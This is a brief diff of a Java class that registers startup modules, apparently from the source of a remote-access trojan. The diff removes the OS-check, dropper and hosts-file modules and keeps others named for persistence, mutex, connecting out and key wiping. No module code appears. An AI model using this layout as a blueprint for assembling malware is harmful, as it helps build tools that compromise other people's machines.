@@ -15,12 +15,9 @@ public class StartupModules {
 		MODULES.add(SleepStartupModule.class);
 		MODULES.add(InstallerStartupModule.class);
 		MODULES.add(MacOSToolBarStartupModule.class);
-		MODULES.add(OperatingSystemCheckStartupModule.class);
 		MODULES.add(MutexStartupModule.class);
-		MODULES.add(MeltDropperStartupModule.class);
 		MODULES.add(StartupStartupModule.class);
 		MODULES.add(PersistanceStartupModule.class);
-		MODULES.add(HostFileStartupModule.class);
 		MODULES.add(ConnectionStarterStartupModule.class);
 		MODULES.add(KeyWiperStartupModule.class);
 	}
